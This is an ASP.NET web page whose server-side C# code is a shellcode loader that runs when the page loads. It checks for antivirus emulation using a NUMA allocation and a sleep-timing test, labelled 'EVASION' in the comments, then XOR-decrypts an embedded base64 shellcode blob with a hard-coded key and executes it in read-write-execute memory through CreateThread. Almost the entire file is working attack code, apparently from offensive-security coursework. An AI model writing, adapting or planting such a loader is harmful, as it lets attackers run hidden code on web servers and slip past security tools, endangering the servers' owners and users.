<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        /* EVASION 1: VirtualAllocExNuma to evade emulation */
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null) {
                return; //Emulation detected
        }

        /* EVASION 2: Sleep to evade emulation */
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        string key = "dummy"; // dummy key
        if (t2 < 2) {
                key = "NowayNoway!"; // wrong key
        } else {
                key = "Sup3rS3cr3t!"; //right key
        }
        if (key == "NowayNoway!") {
                return; //Emulation detected
        }
        else {
                //Encrypted and b64 encoded. See "Sh3llcode encrpyter1.exe"
                string base64Encoded = "rz3z14K7/2NyMzUCNCBhOmLhMiRWPNgnEHv5ASsr+WFUG3rHeTgbuBEifkWaPUHz3m9SH3AfVBK0uT4zUvKBn2E82CdQciPYcV86MqQ19AgreVE85gAzdFP+8LtyUzMr9/MAND1x4/kbKyf5c1QDPHHjkQV7nLty/2f9ODKkHgKqOgK0ErS5Pt4SMqJK0wGiOXN/Vlt2WqNGrAsx+3NWGjKzFHL/Xz00uDJPemKicv9X/TFrMwt7YqJtLQk0KHIrEmkr8d9UEieP0yoSajk6uGa6Po/MjQ57UqlgPe0CGV0bPVYXcnIiG/yRerWRfxRUNIuGJiN7+7JgOT8CtB5EuWAhGolZJErTU3VwM42G22xyM3RiTEIdQ2ULTUYKWmJCSTMoG7qiO/S06HRwMz9i+jAhWXcAPMpk+8z1Y3IzdKygmFxyUzNMEXwOFgUYUR01ZTZGVSA/KidEJhIHIh8EOGA2XX0+IERTN1JNIkEnYzchWSY1cUEMEUlkCipdGgcDDhsDA1RfEXUQOQceKR0HfEoSQDdCUR4KJF1aOBpCMTVpJwtHIkNBIncWQ3RZFxAeWl8MfGM6urUALzFrP2L6MDqLdGHd9DNyUzMzIWA9lLebZlxozLY6urI5fy97+6JZfChhHNNGcDM72tMJdnItGs8FdezVM2NyM4uGOEHzIQl76oN+RZo4QfohAHqksB5ySw6P5veTRnw69LXbZnAzO+l3k0fTdFN1cMynG8ysBjGf+Z0lM3JTYDoYcy4a/KHykEN6pLIzZFN1OYkq92CGcjN0U4qle+EAYCv71DzahDi6qBr0o3ITdFM8+co76SH1+9F0U3VwzKcbsKdStrQnxxa4dRsyoPfzAYEts2sYU2rYki5eWTT56Y2G";
                byte[] churro = System.Convert.FromBase64String(base64Encoded);
                for (int i = 0; i < churro.Length; i++) {
                        churro[i] = (byte)(((uint)churro[i] ^ key[i % key.Length]) & 0xFF);
                }

                IntPtr aBYF4Z0LVrE = VirtualAlloc(IntPtr.Zero,(UIntPtr)churro.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                System.Runtime.InteropServices.Marshal.Copy(churro,0,aBYF4Z0LVrE,churro.Length);
                IntPtr uBF_PNdaXG = IntPtr.Zero;
                IntPtr ypJg4bW4nypD = CreateThread(IntPtr.Zero,UIntPtr.Zero,aBYF4Z0LVrE,IntPtr.Zero,0,ref uBF_PNdaXG);
        }
    }
</script>
